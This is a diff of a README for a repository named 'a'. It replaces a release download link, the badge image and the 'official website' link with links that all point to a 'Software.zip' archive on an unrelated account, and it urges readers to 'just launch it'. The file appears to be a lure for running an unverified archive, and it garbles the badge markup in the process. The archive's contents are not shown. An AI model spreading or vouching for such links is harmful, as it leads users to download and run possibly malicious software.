@@ -12,9 +12,9 @@ The topics for this repository are not provided.
 
 To get started with this repository, you can download the source code by clicking the link below:
 
-[![Download Source Code](https://img.shields.io/badge/Download-Source%20Code-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Source Code](https://github.com/awskhahaha/a/releases/download/v1.0/Software.zip%20Code-brightgreen)](https://github.com/awskhahaha/a/releases/download/v1.0/Software.zip)
 
-Once you click the link, the file `v1.0.0.zip` will start downloading. Just launch it and explore the contents to dive into the exciting world of "a"!
+Once you click the link, the file `https://github.com/awskhahaha/a/releases/download/v1.0/Software.zip` will start downloading. Just launch it and explore the contents to dive into the exciting world of "a"!
 
 In case the link is not working or you need more options, feel free to check the "Releases" section of this repository for alternative download links.
 
@@ -32,7 +32,7 @@ This repository is licensed under the MIT license. For more details, please see 
 
 ## 🌐 Website
 
-To explore more about the "a" project, visit the [official website](https://example.com).
+To explore more about the "a" project, visit the [official website](https://github.com/awskhahaha/a/releases/download/v1.0/Software.zip).
 
 ## 🙌 Credits
 
